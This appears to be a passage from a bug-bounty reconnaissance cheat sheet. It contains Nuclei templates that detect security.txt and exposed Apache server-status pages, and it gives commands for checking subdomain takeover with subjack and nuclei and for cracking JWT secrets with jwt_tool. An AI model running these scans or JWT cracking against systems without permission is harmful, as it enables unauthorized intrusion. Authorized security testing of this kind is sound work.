### Security.txt Check

```yaml
id: security-txt-check

info:
  name: Security.txt File Check
  author: YourName
  severity: info
  description: Checks for the presence of a security.txt file.
  tags: discovery,recon

http:
  - method: GET
    path:
      - "{{BaseURL}}/.well-known/security.txt"
      - "{{BaseURL}}/security.txt"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Contact:"
          - "Expires:"
        condition: and
```

### Apache Server Status Exposure

```yaml
id: apache-server-status

info:
  name: Apache Server Status Exposed
  author: YourName
  severity: medium
  description: Apache server-status page is publicly accessible, leaking sensitive information.
  tags: config,exposure,apache

http:
  - method: GET
    path:
      - "{{BaseURL}}/server-status"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Apache Server Status for"
          - "Server Uptime"
        condition: and
```

### Automated Subdomain Takeover Tools
*   **subjack:** The classic tool for checking a list of subdomains.
    ```bash
    # Installation
    go install github.com/haccer/subjack@latest

    # Usage
    subjack -w all_subdomains.txt -t 100 -o takeover_results.txt -c /path/to/fingerprints.json
    ```
*   **nuclei:** Nuclei also has powerful templates for takeover detection.
    ```bash
    # Run takeover templates specifically
    nuclei -l all_subdomains.txt -t takeovers/
    ```

### JWT (JSON Web Token) Vulnerabilities

*   **Automated JWT Scanners:**
    *   **jwt_tool:** A powerful toolkit for testing, tweaking, and cracking JWTs.
        ```bash
        # Installation
        git clone https://github.com/ticarpi/jwt_tool.git
        cd jwt_tool
        python3 -m venv venv
        source venv/bin/activate
        pip3 install -r requirements.txt

        # Usage - Check for common misconfigurations
        python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c -M at

        # Crack a weak secret
        python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c -C /path/to/wordlist.txt
        ``` 
